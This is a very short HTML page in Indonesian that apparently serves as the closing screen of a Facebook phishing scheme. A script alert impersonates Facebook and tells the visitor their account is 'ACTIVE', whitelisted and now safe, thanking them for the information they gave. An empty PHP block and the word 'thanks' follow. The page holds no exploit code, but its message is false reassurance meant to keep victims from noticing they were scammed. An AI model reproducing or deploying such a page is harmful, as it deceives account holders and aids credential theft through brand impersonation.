
<html>
<head>
	<title>Facebook kamu aman</title>
</head>
<body>
<script>alert('Facebook kamu terdaftar AKTIF dan masuk kedalam WhiteList, terima kasih telah memberitahu kami, sekarang Facebook kamu aman');</script>
<?php
?>
thanks
</body>
</html>	
